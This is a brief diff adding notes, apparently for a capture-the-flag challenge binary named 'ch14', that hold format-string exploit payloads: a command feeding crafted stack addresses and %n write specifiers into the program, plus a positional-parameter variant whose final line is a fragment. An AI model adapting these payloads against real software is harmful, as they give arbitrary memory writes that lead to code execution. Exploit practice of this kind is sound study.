@@ -1,0 +1,6 @@
+### format string ###
+%08x%08x
+./ch14 $(python -c 'print "\xa8\xfa\xff\xbfAAAA"+"\xa9\xfa\xff\xbfAAAA"+"\xaa\xfa\xff\xbfAAAA"+"\xab\xfa\xff\xbfAAAA"+"%08x-"*7+"%0144x%n"+"%0207x%n"+"%0239x%n"+"%049x%n"')
+"\xc8\xfa\xff\xbf\xc9\xfa\xff\xbf\xca\xfa\xff\xbf\xcb\xfa\xff\xbf"+"%9$223x%9$n"+"%10$207x%10$n"+"%11$239x%11$n"+"%12$49x%12$n"')
+
+
